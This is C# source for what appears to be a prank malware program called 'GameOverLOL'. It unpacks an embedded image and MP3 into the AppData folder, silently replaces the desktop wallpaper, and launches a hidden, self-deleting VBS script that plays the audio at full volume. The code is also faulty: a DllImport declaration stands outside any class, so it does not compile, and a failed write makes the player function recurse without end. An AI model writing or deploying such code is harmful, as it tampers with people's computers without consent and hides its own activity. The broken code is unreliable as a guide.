using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace GameOverLOL
{
    // WINAPI
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

    public class GameOverLOL
    {
        public static string appdatar = Environment.GetEnvironmentVariable("appdata");

        public static void WriteFile(string path, string content)
        {
            try
            {
                if (File.Exists(path))
                {
                    try
                    {
                        File.Delete(path);
                    }
                    catch
                    {
                    }
                }
                using StreamWriter streamWriter = new StreamWriter(path);
                streamWriter.Write(content);
            }
            catch
            {
            }
        }

        public static void Cmd(string command, bool wait = false)
        {
            Process process = new Process();
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processStartInfo.FileName = "cmd.exe";
            processStartInfo.Arguments = "/c " + command;
            process.StartInfo = processStartInfo;
            process.Start();
            if (wait)
            {
                process.WaitForExit();
            }
        }


        private static void Player(string filepath, bool songloop = false) {
            string text = "";
            if (File.Exists(appdatar + "\\LastViewII\\player.vbs")) {
                File.Delete(appdatar + "\\LastViewII\\player.vbs");
            }
            if (songloop) {
                text = "objPlayer.settings.setMode \"loop\", True"; // VBS script
            }
            // VBS scitpt
            string content = "Set objPlayer = CreateObject(\"WMPlayer.OCX\")\r\nSet x = CreateObject(\"Scripting.FileSystemObject\")\r\nSet y = CreateObject(\"Wscript.Shell\")\r\n\r\nappdatar = y.ExpandEnvironmentStrings(\"%APPDATA%\")\r\n\r\nobjPlayer.URL = \"" + filepath + "\"\r\nobjPlayer.settings.volume = 100\r\n" + text + "\r\nobjPlayer.controls.play\r\n\r\nDo While objPlayer.playState <> 1\r\n    if x.FileExists(appdatar & \"\\LastViewII\\stop.txt\") Then exit do\r\n    WScript.Sleep 100\r\nLoop\r\n\r\nobjPlayer.close\r\n\r\nSet objPlayer = Nothing\r\nif x.FileExists(appdatar & \"\\LastViewII\\stop.txt\") Then x.DeleteFile appdatar & \"\\LastViewII\\stop.txt\"\r\nif x.FileExists(Wscript.ScriptFullName) Then x.DeleteFile Wscript.ScriptFullName";
            WriteFile(appdatar + "\\LastViewII\\player.vbs", content);
            if (File.Exists(appdatar + "\\LastViewII\\player.vbs"))
            {
                Cmd("if exist \"%appdata%\\LastViewII\\player.vbs\" start \"\" \"%appdata%\\LastViewII\\player.vbs\"");
            }
            else
            {
                Player(filepath, songloop);
            }
        }
        private static void SetDesktopBackground(string imgpath) {
            SystemParametersInfo(20, 0, imgpath, 3);
        }

        public static void LOL()
        {
            Taker.Take("lol.jpg", appdatar + "\\lol.jpg");
            Taker.Take("ce.mp3", appdatar + "\\ce.mp3");
            SetDesktopBackground(appdatar + "\\lol.jpg");
            Player(appdatar + "\\ce.mp3");
        }
    }

    public class Taker
    {
        public static void Take(string filename, string output_filename = "false")
        {
            if (output_filename == "false")
            {
                output_filename = filename;
            }
            string name = Assembly.GetExecutingAssembly().GetName().Name;
            string name2 = name + "." + filename;
            using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name2);

            if (stream != null)
            {
                using (FileStream destination = File.Create(output_filename))
                {
                    stream.CopyTo(destination);
                    return;
                }
            }
        }
    }
}